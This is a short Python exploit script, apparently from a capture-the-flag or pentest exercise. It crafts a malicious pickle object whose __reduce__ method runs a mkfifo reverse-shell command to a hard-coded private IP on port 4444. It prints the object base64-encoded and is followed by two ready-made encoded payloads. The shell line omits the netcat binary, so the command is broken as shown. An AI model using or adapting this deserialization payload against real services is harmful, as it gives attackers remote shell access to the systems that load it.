import pickle
import sys
import base64

command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | 10.2.32.50 4444 > /tmp/f"

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))

10.1.26.207
# gASVbgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFNybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCAgMTAuMS41My4xOTYgNDQ0NCA+IC90bXAvZpSFlFKULg==
gANjcG9zaXgKc3lzdGVtCnEAWFEAAABybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCAxMC4yLjMyLjUwIDQ0NDQgPiAvdG1wL2ZxAYVxAlJxAy4=